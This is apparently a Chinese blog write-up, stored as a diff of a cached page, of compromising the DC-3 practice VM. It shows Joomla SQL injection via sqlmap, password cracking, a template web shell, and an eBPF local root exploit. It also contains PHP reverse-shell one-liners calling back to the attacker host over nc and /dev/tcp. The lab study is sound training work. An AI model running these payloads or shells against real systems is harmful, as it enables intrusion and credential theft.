@@ -1,0 +1,155 @@
+I"	<h3 id="主机识别">主机识别</h3>
+
+<p><code class="language-plaintext highlighter-rouge">arp-scan -l</code></p>
+
+<h3 id="网络拓扑">网络拓扑</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>计算机</th>
+      <th>IP</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>本机（Win10）</td>
+      <td><code class="language-plaintext highlighter-rouge">192.168.1.105</code></td>
+    </tr>
+    <tr>
+      <td>Kali</td>
+      <td><code class="language-plaintext highlighter-rouge">192.168.1.112</code></td>
+    </tr>
+    <tr>
+      <td>DC-3</td>
+      <td><code class="language-plaintext highlighter-rouge">192.168.1.108</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="扫描端口和版本信息">扫描端口和版本信息</h3>
+
+<p><code class="language-plaintext highlighter-rouge">nmap -A 192.168.1.108</code></p>
+
+<p><img src="https://i.loli.net/2020/05/11/Xb7l25yrF9agYcB.png" alt="1.png" /></p>
+
+<h3 id="访问web并确定web应用">访问Web并确定web应用</h3>
+
+<p>根据 Nmap 扫描结果可知，web 应用程序运行 <strong>Joomla</strong> 开源 CMS系统，但没有版本号</p>
+
+<p><img src="https://i.loli.net/2020/05/11/BKXV9Cnl56RdPDq.png" alt="2.png" /></p>
+
+<p>访问 <strong>80</strong> 端口，从首页中我们知道该系统存在账户 <em>admin</em>，并且有登录框，因此我们可以采取密码爆破。不过我们应该将它作为备用方案，因为这是一件费时的事。</p>
+
+<p>既然我们已经知道了运行的程序，接下来的任务是找到它的版本号，并且根据版本号上网查找是否存在漏洞。</p>
+
+<p>幸运的是，在 Debian 发行版中有针对于 Joomla 的检测工具，执行命令下载并运行</p>
+
+<p><code class="language-plaintext highlighter-rouge">apt-get install joomscan</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">joomscan -u http://192.168.1.108</code></p>
+
+<p><img src="https://i.loli.net/2020/05/11/SlV741eCUr5EJj2.png" alt="3.png" /></p>
+
+<p>根据检测结果，顺利得到 Joomla 的版本号：<strong>3.7.0</strong></p>
+
+<p><img src="https://i.loli.net/2020/05/11/2yFxEH5mt3ioaQP.png" alt="4.png" /></p>
+
+<p>查看 <em>42033.txt</em>（<strong><code class="language-plaintext highlighter-rouge">/usr/share/exploitdb/exploits/php/webapps/42033.txt</code></strong>）</p>
+
+<pre><code class="line-numbers">sqlmap -u "http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
+</code></pre>
+
+<p>修改其中部分信息</p>
+
+<pre><code class="line-numbers">sqlmap -u "http://192.168.1.108/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --random-agent --dbs -p list[fullordering] --batch
+</code></pre>
+
+<p><img src="https://i.loli.net/2020/05/11/rDJwBtWhc4i3QZb.png" alt="5.png" /></p>
+
+<p>接下来就是 <em>sqlmap</em> 工具的使用</p>
+
+<pre><code class="line-numbers">sqlmap -u "http://192.168.1.108/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --random-agent -D joomladb --tables -p list[fullordering] --batch
+sqlmap -u "http://192.168.1.108/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --random-agent -D joomladb -T #__users --dump -p list[fullordering]
+</code></pre>
+
+<p><img src="https://i.loli.net/2020/05/11/Qo9X2zM5rGWDlHT.png" alt="6.png" /></p>
+
+<p>使用 <em>john</em> 工具进行密码爆破</p>
+
+<p><img src="https://i.loli.net/2020/05/11/xfrpWEsH8GB2kJq.png" alt="7.png" /></p>
+
+<p>至此我们得到账户和密码：<code class="language-plaintext highlighter-rouge">admin:snoopy</code></p>
+
+<h3 id="getshell">Getshell</h3>
+
+<p>使用账号密码登录系统（<code class="language-plaintext highlighter-rouge">http://192.168.1.108/administrator/</code>），并且在模板中新建 <em>shell.php</em> 文件，之后访问地址：<code class="language-plaintext highlighter-rouge">http://192.168.1.108/templates/protostar/shell.php</code></p>
+
+<p><img src="https://i.loli.net/2020/05/11/QcI7Tq4prnMF9Jf.png" alt="9.png" /></p>
+
+<p>在 Kali 上监听 <strong>6677</strong> 端口后查看系统内核和发行版</p>
+
+<p><img src="https://i.loli.net/2020/05/11/iZKhe3yBu987lOS.png" alt="10.png" /></p>
+
+<h3 id="提权">提权</h3>
+
+<p>根据内核版本搜索可利用漏洞</p>
+
+<p><img src="https://i.loli.net/2020/05/11/Sk8NnHCbfGUhlpL.png" alt="11.png" /></p>
+
+<p>发现都是 <strong>64</strong> 位操作系统，但目标系统是 <strong>32</strong> 位，那我们搜索发行版本号试试</p>
+
+<p><img src="https://i.loli.net/2020/05/11/KBjOxUiZuyP4cGD.png" alt="12.png" /></p>
+
+<p>从中找出<strong>本地提权</strong>的可利用漏洞，那么就选择图中选中部分，查看<code class="language-plaintext highlighter-rouge">/usr/share/exploitdb/exploits/linux/exploits/linux/local/39772.txt</code>文本内容，看来需要我们下载压缩包，接下来照着提示内容做就行</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td> --><td class="rouge-code"><pre>wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
+unzip 39772.zip &amp;&amp; cd 39772
+tar -xvf exploit.tar
+cd ebpf_mapfd_doubleput_exploit
+./compile.sh
+./doubleput
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><img src="https://i.loli.net/2020/05/11/XGznZcBmJysLUDW.png" alt="8.png" /></p>
+
+<h3 id="总结">总结</h3>
+
+<ol>
+  <li>确认 web fingerprint 信息可以采用：
+    <ol>
+      <li><code class="language-plaintext highlighter-rouge">whatweb http://192.168.1.108</code></li>
+      <li><code class="language-plaintext highlighter-rouge">curl -I http://192.168.1.108</code></li>
+      <li>Firefox 插件 Wappalyzer</li>
+    </ol>
+  </li>
+  <li>PHP shell
+    <ol>
+      <li>代码1</li>
+    </ol>
+  </li>
+</ol>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td> --><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
+<span class="nb">system</span><span class="p">(</span><span class="s1">'rm /tmp/aa;mkfifo /tmp/aa;cat /tmp/aa | /bin/bash -i 2&gt;&amp;1 | nc 192.168.1.112 6677 &gt; /tmp/aa'</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td> --><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
+<span class="nb">system</span><span class="p">(</span><span class="s2">"bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.1.112/6677 0&gt;&amp;1' "</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+:ET
